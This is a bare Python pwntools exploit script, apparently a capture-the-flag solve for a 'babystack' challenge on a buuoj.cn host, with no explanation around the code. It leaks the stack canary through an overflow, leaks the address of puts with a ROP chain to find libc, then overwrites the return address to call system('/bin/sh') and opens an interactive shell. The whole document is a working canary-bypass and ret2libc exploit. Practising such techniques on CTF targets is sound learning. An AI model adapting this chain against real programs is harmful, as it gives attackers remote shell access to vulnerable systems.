from pwn import *
from LibcSearcher import *

context.arch = 'amd64'

p = remote('node4.buuoj.cn', 28337)
elf = ELF('./babystack')
pop_rdi_ret = 0x400a93

p.sendlineafter('>> ', '1')
p.send('a' * 0x89)
p.sendafter('>> ', '2')
p.recv(0x89)
canary = unpack(b'\x00' + p.recv(7))
if canary >> 56 == 0x2d:
    quit()
p.sendafter('>> ', '1')
p.send(
    b'a' * 0x88 + flat([canary, 0xdadadadadadadada, pop_rdi_ret, elf.got['puts'], elf.plt['puts'], 0x400908]))
p.sendafter('>> ', '3')
puts_address = unpack(p.recv(6).ljust(8, b'\x00'))
libc = LibcSearcher('puts', puts_address)
libc_base = puts_address - libc.dump('puts')
system_address = libc_base + libc.dump('system')
bin_sh_address = libc_base + libc.dump('str_bin_sh')
p.sendafter('>> ', '1')
p.send(
    b'a' * 0x88 + flat([canary, 0xdadadadadadadada, pop_rdi_ret, bin_sh_address, system_address]))
p.sendafter('>> ', '3')
p.interactive()
